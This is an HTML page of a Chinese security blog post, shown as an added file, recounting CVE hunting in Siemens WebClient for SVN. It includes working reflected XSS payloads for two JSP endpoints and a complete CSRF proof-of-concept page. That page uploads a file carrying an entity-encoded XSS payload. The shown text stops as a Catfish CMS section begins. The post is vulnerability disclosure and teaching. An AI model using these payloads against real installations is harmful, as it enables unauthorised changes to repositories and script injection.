@@ -1,0 +1,839 @@
+<!DOCTYPE html>
+<html lang="">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="fseeeye">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="fseeeye">
+    
+    <meta name="keywords" content="fseeeye,archer,hacker blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="The foregoing.现今，工业领域随时代潮流所需，工控厂商逐渐需要Web应用程序满足业务服务、设备管控需求，以解放人力，而Web应用程序面临的最大问题就是来自网络的黑客攻击。针对本月工作内挖的两个应用程序漏洞，漫谈想法和经验。 #PART1: Siemens WebClient for SVN 环境描述与搭建该Web应用程序属于西门子the Polarion Community方案中的产品">
+<meta property="og:type" content="article">
+<meta property="og:title" content="近期的CVE挖掘总结">
+<meta property="og:url" content="http://hducaiji.github.io/2020/06/01/mycve1/index.html">
+<meta property="og:site_name" content="FSEEEYE">
+<meta property="og:description" content="The foregoing.现今，工业领域随时代潮流所需，工控厂商逐渐需要Web应用程序满足业务服务、设备管控需求，以解放人力，而Web应用程序面临的最大问题就是来自网络的黑客攻击。针对本月工作内挖的两个应用程序漏洞，漫谈想法和经验。 #PART1: Siemens WebClient for SVN 环境描述与搭建该Web应用程序属于西门子the Polarion Community方案中的产品">
+<meta property="og:image" content="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/add-directory.png">
+<meta property="og:image" content="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/add-directory-success.png">
+<meta property="og:image" content="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/xss1.png">
+<meta property="og:image" content="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/xss2.png">
+<meta property="og:image" content="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/xss3.png">
+<meta property="og:image" content="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/xss4.png">
+<meta property="og:image" content="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/xss5.png">
+<meta property="og:image" content="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/xss6.png">
+<meta property="og:image" content="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/xss7.png">
+<meta property="og:image" content="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/csrf.png">
+<meta property="og:image" content="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/cms-xss1.png">
+<meta property="og:image" content="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/cms-xss2.png">
+<meta property="article:published_time" content="2020-06-01T07:19:12.000Z">
+<meta property="article:modified_time" content="2020-06-01T07:31:57.279Z">
+<meta property="article:author" content="fseeeye">
+<meta property="article:tag" content="CVE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/add-directory.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <link rel="alternate" href="/atom.xml" title="FSEEEYE" type="application/atom+xml">
+    
+    <title>近期的CVE挖掘总结 · fseeeye&#39;s playsite</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon_eye.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >FSEEEYE</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">近期的CVE挖掘总结</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>FSEEEYE</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            近期的CVE挖掘总结
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "CVE">CVE</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">2.8k</span>阅读时长: <span class="post-count reading-time">11 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/06/01</span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="The-foregoing"><a href="#The-foregoing" class="headerlink" title="The foregoing."></a>The foregoing.</h1><p>现今，工业领域随时代潮流所需，工控厂商逐渐需要Web应用程序满足业务服务、设备管控需求，以解放人力，而Web应用程序面临的最大问题就是来自网络的黑客攻击。针对本月工作内挖的两个应用程序漏洞，漫谈想法和经验。</p>
+<p>#PART1: Siemens WebClient for SVN</p>
+<h2 id="环境描述与搭建"><a href="#环境描述与搭建" class="headerlink" title="环境描述与搭建"></a>环境描述与搭建</h2><p>该Web应用程序属于西门子the Polarion Community方案中的产品，用于解决subversion(SVN)数据在线迁移和管理的应用。SVN是一种开源版本控制系统，主要用于管理、存储、恢复实时变化的数据，类似于数据的git工具，可适用于针对工控行业底层设备数据的存储与维护。本文采用漏洞应用程序与依赖环境如下：</p>
+<blockquote>
+<ul>
+<li>Siemens WebClient for SVN 最新版本 3.1.0: <a href="https://polarion.plm.automation.siemens.com/products/svn/svn_webclient" target="_blank" rel="noopener">https://polarion.plm.automation.siemens.com/products/svn/svn_webclient</a></li>
+<li>SVN：VisualSVN Server for Windows (在svn webclient中设置ParentRepositoryDirectory以管理多个SVN仓库，测试仓库名为test)</li>
+<li>Web应用服务器：Tomcat</li>
+<li>测试浏览器：Chrome</li>
+<li>测试主机系统：macOS Catalina</li>
+</ul>
+</blockquote>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>具本人对工控行业相关产品/服务近几年CVE的阅读，只要与Web相关的CVE，XSS占据绝大比例。像这类从changes.txt就能看出年代相对较早的Web应用，更可先从XSS考量，尝试性地进行漏洞挖掘工作。<br>先谈谈挖掘手法，很多师傅还秉持着先直接输入类似<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>或加入更多前缀的payload查看是否弹框的方式来判断XSS的生成。个人认为，这是相当浪费手工测试效率的做法，除非您集成了大量高级payload并做成自动化测试。无论是白盒还是黑盒挖掘，我们虽然是手工测试，但是可以参考自动化工具的实现思路来提高挖掘效率和成功率。普通的XSS自动化，在爬虫实现和确认过滤后通常会在参数点放置随机字符串，然后在服务器响应报文中定位随机字符串在其中出现的位置来判断应该如何构造payload。那么在手工中，我们可以先跳过需要大量工作的检查过滤，直接先输入随机字符串，针对出现位置尝试构造payload测试，下文中便采用这种手法。</p>
+<h3 id="first-vuln"><a href="#first-vuln" class="headerlink" title="first vuln"></a>first vuln</h3><ul>
+<li>登陆后，通过观察该应用的功能，不难发现应用存在添加文件夹的功能：<img src="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/add-directory.png" alt="add-directory">输入文件夹名称和说明后，并不会直接跳转，而是会展示成功界面：<img src="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/add-directory-success.png" alt="add-directory-success">且其URL始终定位在<code>directoryAdd.jsp?location=test&amp;url=</code>上，可以尝试对url添加参数测试。</li>
+<li>按照开头的想法，我们在提交参数中输入随机字符串<code>directoryAdd.jsp?location=test&amp;url=wpd3dGY</code>，定位参数出现的位置：<img src="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/xss1.png" alt="xss1">从结果中我们发现几处感兴趣的注入点，一个个进行测试即可。我们针对图中四处进行挨个测试。</li>
+<li>第一处需要脱离出双引号，但是应用直接复制URL进入href中，无法注入双引号。第二处存在于a标签包裹中，构建payload如下<code>directoryAdd.jsp?location=test&amp;url=wpd3dGY%3a%2fa%3e%3ascript%3ealert(1)%3a%2fscript%3e</code>，发现应用直接过滤script标签以及包裹的内容，猜想对于常见XSS标签均会过滤，先进行下一处测试，此处留待后续。<img src="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/xss2.png" alt="xss2"></li>
+<li>第三处直接位于script标签中，并不需要输入标签就可能实现XSS。payload如下：<code>%22,%20%22location=x%22);alert(1);//</code>，发现payload完成插入，转向浏览器发现成功alert。<img src="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/xss3.png" alt="xss3"><img src="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/xss4.png" alt="xss4"></li>
+</ul>
+<h3 id="second-vuln"><a href="#second-vuln" class="headerlink" title="second vuln"></a>second vuln</h3><ul>
+<li>继续观察该应用功能，视线关注到添加文件更新功能，其存在于点选某存储在SVN的文件后。引起我注意的是，它的URL中依旧类似添加文件夹的功能，存在一个url参数，用于设定需要更新的文件名。</li>
+<li>尝试前一处漏洞的payload，依旧可以成功执行:<img src="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/xss5.png" alt="xss5"></li>
+<li>我们可以按照之前的思路，看看有没有新的问题出现，可以注意到这次的matches多出了一处，是一个hidden的input标签。虽然它依旧需要我们写入标签，但不需要a标签闭合，也不是复制URL进值中，可以逃逸双引号。既然如此，我们继续尝试构造payload，观察其不能够过滤何种标签。<img src="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/xss6.png" alt="xss6"></li>
+<li>测试到img标签后，发觉写入成功，成功挖掘到另一个XSS，payload如下：<code>fileUpdate.jsp?location=test&amp;url=wpd3dGY%22%3E%3Cimg%20src=a%20onerror=alert(1)%3E</code><img src="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/xss7.png" alt="xss7"></li>
+</ul>
+<p>该应用中依旧存在多处XSS，供读者按照思路动手实践。</p>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>对于CSRF漏洞，我们挖掘时应该更换一种思路——从漏洞的防御上思考。为什么普遍采用这种思路呢？因为目前CSRF防御思路非常简单，除了不太通用的检查HTTP Refer是否同域，一般采用验证码、一次性token等在使用关键功能时，验证用户身份。我们只要在浏览Web应用是否实现了这种防御措施，即可初步判断其是否存在CSRF漏洞，很自然的，svn webclient并没有做到这一点，我们可以通过创建恶意站点，又到用户访问后即可在其不知情的情况下做到插入文件、新建文件夹等。</p>
+<ul>
+<li>在我们创建恶意站点前，需要先用BurpSuite等工具拦截数据包，了解其传输数据构成。如插入一个名为<code>csrf.html</code>文件的HTTP请求内容如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;svnwebclient&#x2F;fileAddAction.jsp?location&#x3D;test&amp;url&#x3D; HTTP&#x2F;1.1</span><br><span class="line">Host: 10.0.0.2:8080</span><br><span class="line">Content-Length: 307</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Origin: http:&#x2F;&#x2F;10.0.0.2:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">DNT: 1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary4aEfgEhGN990clxI</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;81.0.4044.138 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;10.0.0.2:8080&#x2F;svnwebclient&#x2F;fileAdd.jsp?location&#x3D;test&amp;url&#x3D;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,la;q&#x3D;0.7</span><br><span class="line">Cookie: JSESSIONID&#x3D;915759257D068C82D0F4B17741A1208A; DirectoryContentSortField&#x3D;name; DirectoryContentSortOrder&#x3D;asc</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary4aEfgEhGN990clxI</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;filepath&quot;; filename&#x3D;&quot;csrf.html&quot;</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line"></span><br><span class="line">xxxx</span><br><span class="line">------WebKitFormBoundary4aEfgEhGN990clxI</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;comment&quot;</span><br><span class="line"></span><br><span class="line">File was added remotely</span><br><span class="line">------WebKitFormBoundary4aEfgEhGN990clxI--</span><br></pre></td></tr></table></figure></li>
+<li>根据其内容，我们可以创建一个通过点击在svn中插入<code>csrf.html</code>文件的恶意站点：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">history.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">      <span class="function"><span class="keyword">function</span> <span class="title">submitRequest</span><span class="params">()</span></span></span></span><br><span class="line">      &#123;</span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="actionscript">        xhr.open(<span class="string">"POST"</span>, <span class="string">"http:\/\/&lt;HIDDEN&gt;\/svnwebclient\/fileAddAction.jsp?location=&lt;LOCATION&gt;&amp;url="</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"multipart\/form-data; boundary=----WebKitFormBoundaryFqGs6aNB3pRkk9TY"</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.setRequestHeader(<span class="string">"Accept"</span>, <span class="string">"text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,image\/apng,*\/*;q=0.8,application\/signed-exchange;v=b3;q=0.9"</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.setRequestHeader(<span class="string">"Accept-Language"</span>, <span class="string">"zh-CN,zh;q=0.9,en;q=0.8,la;q=0.7"</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> body = <span class="string">"------WebKitFormBoundaryFqGs6aNB3pRkk9TY\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"Content-Disposition: form-data; name=\"filepath\"; filename=\"csrf.html\"\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"Content-Type: text/html\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"\r\n"</span> + </span></span><br><span class="line"><span class="handlebars"><span class="xml">          "\x3c<span class="symbol">&amp;#105;</span>MG SRC=<span class="symbol">&amp;#106;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#118;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#105;</span><span class="symbol">&amp;#112;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#58;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#39;</span><span class="symbol">&amp;#88;</span><span class="symbol">&amp;#83;</span><span class="symbol">&amp;#83;</span><span class="symbol">&amp;#39;</span><span class="symbol">&amp;#41;</span>\x3e\n" + </span></span></span><br><span class="line"><span class="actionscript">          <span class="string">"\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"------WebKitFormBoundaryFqGs6aNB3pRkk9TY\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"Content-Disposition: form-data; name=\"comment\"\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"File was added remotely\r\n"</span> + </span></span><br><span class="line"><span class="actionscript">          <span class="string">"------WebKitFormBoundaryFqGs6aNB3pRkk9TY--\r\n"</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> aBody = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(body.length);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; aBody.length; i++)</span></span><br><span class="line">          aBody[i] = body.charCodeAt(i); </span><br><span class="line"><span class="actionscript">        xhr.send(<span class="keyword">new</span> Blob([aBody]));</span></span><br><span class="line">      &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"#"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> <span class="attr">onclick</span>=<span class="string">"submitRequest();"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li>之后，登陆应用后访问该HTML并点击按钮就可以观察到svn已被插入新文件：<img src="https://fseeeye.oss-cn-hangzhou.aliyuncs.com/blog/20200529CVE/csrf.png" alt="csrf"></li>
+</ul>
+<h1 id="PART2-Catfish-CMS"><a href="#PART2-Catfish-CMS" class="headerlink" title="PART2: Catfish CMS"></a>PART2: Catfish CMS</h1><p>工控厂商为了通常需要创建一个官方站点，提供企业信息、新闻、招聘。出于技术原因和开发成本的考量，通常会选用在CMS开发官网。该实例就从CMS的源码审计角度来提供CMS漏洞挖掘的参考。本文采用漏洞应用程序与依赖环境如下：</p>
+<blockquote>
+<ul>
+<li>Catfish CMS 4.9.2: <a href="http://www.catfish-cms.com/" target="_blank" rel="noopener">http://www.catfish-cms.com</a></li>
+<li>Web应用服务器: Catfish官方提供的集成环境 <a href="http://www.catfish-cms.com/page/17.html" target="_blank" rel="noopener">http://www.catfish-cms.com/page/17.html</a></li>
+<li>测试浏览器：Chrome</li>
+<li>测试主机系统：macOS Catalina</li>
+</ul>
+</blockquote>
